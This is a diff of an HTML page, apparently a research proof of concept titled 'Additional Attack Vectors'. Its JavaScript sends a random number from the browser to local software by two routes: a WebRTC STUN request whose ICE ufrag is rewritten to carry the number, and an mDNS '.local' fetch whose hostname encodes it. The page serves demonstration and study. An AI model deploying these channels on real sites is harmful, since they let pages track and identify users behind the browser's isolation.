@@ -3,29 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebRTC IPv6</title>
+    <title>Additional Attack Vectors</title>
 </head>
 <body>
-    <h3>WebRTC IPv6</h3>
-    <p><strong>Disclaimer:</strong> This method likely won't work if there is fewer than two addresses printed.</p>
-    <label for="port">Port to use:</label>
-    <input type="number" id="port" min="1" max="65535" value="10000" />
+    <h2>Additional Attack Vectors</h2>
+    <p>This page incorporates additional attack vectors.</p>
+    <p>Each of the methods sends the following random number to the loopback address.</p>
+    <p>Random Number: <span id="random-number">Not Generated</span></p>
+    <button onclick="generateNumber()">Generate New Random Number</button>
+
     <br><br>
-    <button onclick="gatherNewCandidates()">Gather new candidate addresses</button>
+
+    <!-- WebRTC IPv6 channel -->
+    <h3>WebRTC & IPv6 Global Unicast Addresses</h3>
+    <label for="double_port">Port:</label>
+    <input type="number" id="double_port" min="1" max="65535" value="10000" />
     <br><br>
-    <label for="index">Index of Address to use (zero indexed):</label>
-    <input type="number" id="index" value="1" />
-    <p>Example data: testdata123</p>
-    <label for="data">Data to send as ufrag:</label>
-    <input type="text" id="data" value="testdata123" />
+    <label for="double_index">Index of Address (zero indexed):</label>
+    <input type="number" id="double_index" value="1" />
     <br><br>
-    <button onclick="sendWithAddress()">Send with STUN (Indexed Address)</button>
-    <p>Candidate addresses: <span id="addresses"></span></p>
+    <button onclick="sendDoubleIndexed()">Send with STUN (Selected Address)</button>
+    <br><br>
+    <button onclick="printUUIDs()">Print candidate addresses</button>
+    <p>Candidate addresses: <span id="double_addresses"></span></p>
+
+    <!-- mDNS lookup -->
+    <h3>mDNS lookup</h3>
+    <button onclick="sendLookup()">Send mDNS lookup request</button>
 
     <script>
-        gatherNewCandidates()
-        
-        async function gatherNewCandidates() {
+        function generateNumber() {
+            randomNumber = Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('random-number').innerText = randomNumber;
+        }
+        // WebRTC double channel
+        printUUIDs()
+
+        async function printUUIDs() {
             p = new RTCPeerConnection()
             dc = p.createDataChannel('ipv6')
             const addresses = []
@@ -46,18 +60,18 @@
                 await new Promise(resolve => p.onicegatheringstatechange = resolve)
 
             // Print out candidates
-            document.getElementById('addresses').innerText = "\n"
+            document.getElementById('double_addresses').innerText = "\n"
             for (const address of addresses) {
                 console.log(address)
-                document.getElementById('addresses').innerText += address
-                document.getElementById('addresses').innerText += "\n"
+                document.getElementById('double_addresses').innerText += address
+                document.getElementById('double_addresses').innerText += "\n"
             }
         }
 
-        async function sendWithAddress() {
-            ufrag = document.getElementById('data').value
-            port = document.getElementById('port').value
-            address_index = document.getElementById('index').value
+        async function sendDoubleIndexed() {
+            ufrag = 'sendIPv6GUA' + randomNumber
+            port = document.getElementById('double_port').value
+            address_index = document.getElementById('double_index').value
 
             p = new RTCPeerConnection()
             dc = p.createDataChannel('ipv6')
@@ -79,11 +93,11 @@
                 await new Promise(resolve => p.onicegatheringstatechange = resolve)
 
             // Print out candidates
-            document.getElementById('addresses').innerText = "\n"
+            document.getElementById('double_addresses').innerText = "\n"
             for (const address of addresses) {
                 console.log(address)
-                document.getElementById('addresses').innerText += address
-                document.getElementById('addresses').innerText += "\n"
+                document.getElementById('double_addresses').innerText += address
+                document.getElementById('double_addresses').innerText += "\n"
             }
 
             // Select address to use
@@ -99,6 +113,21 @@
                 a.sdp.replace(/ice-ufrag:.+/g, 'ice-ufrag:' + ufrag)
                 + `a=candidate:4234997325 1 udp 2043278322 ${localAddr} ${port} typ host\r\n` })
         }
+
+        // mDNS lookup
+        function sendLookup() {
+            data = "sendLookup" + randomNumber
+            fetch('https://' + data + '.local')
+                .then(response => response.text())
+                .then(text => console.log('Response:', text))
+                .catch(err => console.error('Fetch error:', err));
+
+        }
+
+        window.addEventListener("DOMContentLoaded", () => {
+            // Generate random number at load
+            generateNumber()
+        });
     </script>
 </body>
 </html>
